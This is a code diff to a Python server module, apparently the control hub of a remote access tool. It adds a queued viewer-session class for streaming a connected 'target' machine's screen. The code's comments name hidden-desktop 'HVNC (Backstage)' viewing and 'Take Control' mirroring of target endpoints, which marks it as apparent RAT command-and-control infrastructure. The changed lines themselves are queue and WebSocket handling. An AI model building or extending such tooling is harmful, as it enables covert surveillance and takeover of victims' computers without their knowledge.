@@ -12,6 +12,39 @@ from fastapi import WebSocket
 logger = logging.getLogger("master_hub.agent_manager")
 
 
+import asyncio
+
+class ViewerSession:
+    """Encapsulates an admin viewer WebSocket with a single-writer frame queue."""
+    def __init__(self, viewer_id: str, ws: WebSocket):
+        self.viewer_id = viewer_id
+        self.ws = ws
+        self.queue: asyncio.Queue = asyncio.Queue(maxsize=2)
+        self.sender_task: Optional[asyncio.Task] = None
+
+    def push_frame(self, frame_bytes: bytes):
+        if self.queue.full():
+            try:
+                self.queue.get_nowait()
+            except Exception:
+                pass
+        try:
+            self.queue.put_nowait((frame_bytes, True))
+        except Exception:
+            pass
+
+    def push_text(self, text_data: str):
+        if self.queue.full():
+            try:
+                self.queue.get_nowait()
+            except Exception:
+                pass
+        try:
+            self.queue.put_nowait((text_data, False))
+        except Exception:
+            pass
+
+
 class ConnectedAgent:
     """Represents a connected target endpoint."""
 
@@ -22,10 +55,10 @@ class ConnectedAgent:
         self.connected_at = time.time()
         self.last_heartbeat = time.time()
         # HVNC (Backstage) viewers
-        self.viewers: Dict[str, WebSocket] = {}
+        self.viewers: Dict[str, ViewerSession] = {}
         self.is_streaming_hvnc = False
         # Mirror (Take Control) viewers
-        self.mirror_viewers: Dict[str, WebSocket] = {}
+        self.mirror_viewers: Dict[str, ViewerSession] = {}
         self.is_streaming_mirror = False
 
     def update_info(self, info: Dict[str, Any]):
@@ -150,23 +183,26 @@ class AgentManager:
             )
         )
 
-    def attach_viewer(self, agent_id: str, viewer_id: str, viewer_ws: WebSocket, mode: str = "backstage") -> bool:
+    def attach_viewer(self, agent_id: str, viewer_id: str, viewer_ws: WebSocket, mode: str = "backstage") -> Optional[ViewerSession]:
         agent = self.get_agent(agent_id)
         if agent:
+            session = ViewerSession(viewer_id, viewer_ws)
             if mode == "mirror":
-                agent.mirror_viewers[viewer_id] = viewer_ws
+                agent.mirror_viewers[viewer_id] = session
             else:
-                agent.viewers[viewer_id] = viewer_ws
-            return True
-        return False
+                agent.viewers[viewer_id] = session
+            return session
+        return None
 
     def detach_viewer(self, agent_id: str, viewer_id: str, mode: str = "backstage"):
         agent = self.get_agent(agent_id)
         if agent:
             if mode == "mirror":
-                agent.mirror_viewers.pop(viewer_id, None)
+                session = agent.mirror_viewers.pop(viewer_id, None)
             else:
-                agent.viewers.pop(viewer_id, None)
+                session = agent.viewers.pop(viewer_id, None)
+            if session and session.sender_task and not session.sender_task.done():
+                session.sender_task.cancel()
 
     def remove_agent(self, agent_id: str) -> bool:
         """Removes an agent from registered and active lists and instructs target process to terminate cleanly."""
